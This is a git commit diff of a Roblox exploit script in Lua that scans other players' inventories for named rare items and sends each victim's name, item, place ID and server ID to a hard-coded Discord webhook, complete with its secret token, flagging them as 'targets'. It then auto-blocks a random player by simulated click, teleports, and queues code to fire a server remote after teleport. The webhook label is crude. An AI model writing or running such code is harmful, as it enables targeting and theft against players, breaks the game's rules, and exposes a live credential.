bcc39d08d0f573663eab24ddcd0869963ee1696b
mandarinman <125588808+mandarinman@users.noreply.github.com>
2023-02-16 19:37:06 +0200

    Update hi.lua

--- hi.lua
+++ hi.lua
@@ -1,6 +1,58 @@
-repeat wait() until game:IsLoaded()
-wait(5)
+local url = "https://discord.com/api/webhooks/1075807872660799518/wHwpxfk2IVuwrU-97fwI_LUIFRnh1nmc2lO0g40KvS3-9uuc0HADhPXAnG2rfHCzzqv6"
+local itemWhitelist = {"Curved", "Crypt", "Railblade", "Gran Sud", "Light's Final Toll", "Razor Cutlass"}
+local lplr = game.Players.Assanatal
+for _, player in pairs(game.Players:GetChildren()) do
+    if player.Name == game.Players.LocalPlayer.Name then continue end
+    for _, tool in pairs(player.Backpack:GetChildren()) do
+        for _, itemName in pairs(itemWhitelist) do
+            if string.find(tool.Name:lower(), itemName:lower()) then
+                local data = {
+                    ["content"] = "<@919246967639519262>, the target is in "..tostring(game.PlaceId),
+                    ["username"] = "PRIMADON SEX DUNGEON",
+                    ["avatar_url"] = "https://c0.wallpaperflare.com/preview/908/958/489/primate-ape-monkey-mammal.jpg",
+                    ["embeds"] = {
+                        {
+                            ["title"] = "PRIMADON'S TARGET: "..tostring(player.Name),
+                            ["description"] = "Item: "..tostring(tool.Name),
+                            ["type"] = "rich",
+                            ["color"] = 22000,
+                            ["footer"] = {
+                                ["icon_url"] = "https://c0.wallpaperflare.com/preview/908/958/489/primate-ape-monkey-mammal.jpg",
+                                ["text"] = "a"..tostring(game.JobId)
+                            }
+                        }    
+                    }            
+                                
+                }
+                local newdata = game:GetService("HttpService"):JSONEncode(data)
+                local headers = {
+                    ["content-type"] = "application/json"
+                }
+                request = http_request or request or HttpPost or syn.request
+                local send = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                request(send)
+                end
+            end
+        end
+end
 
+
+math.randomseed(os.clock())
+local plrs = game.Players:GetChildren()
+local targetPlayer
+repeat wait()
+	targetPlayer = plrs[math.random(1,#plrs)]
+	if targetPlayer == lplr then targetPlayer = nil end
+until targetPlayer
+game.StarterGui:SetCore("PromptBlockPlayer", targetPlayer)
+wait(2)
+mouse1click(885, 636)
+wait(1)
+game:GetService'TeleportService':Teleport(4111023553)
+
+
+syn.queue_on_teleport([[
+repeat wait() until game:IsLoaded()
 local ohString1 = "A"
 local jobID = "none"
 local ohTable2 = {
@@ -17,3 +69,4 @@ pcall(function()
 
     PS:FireServer(jobID)
 end)
+    ]])
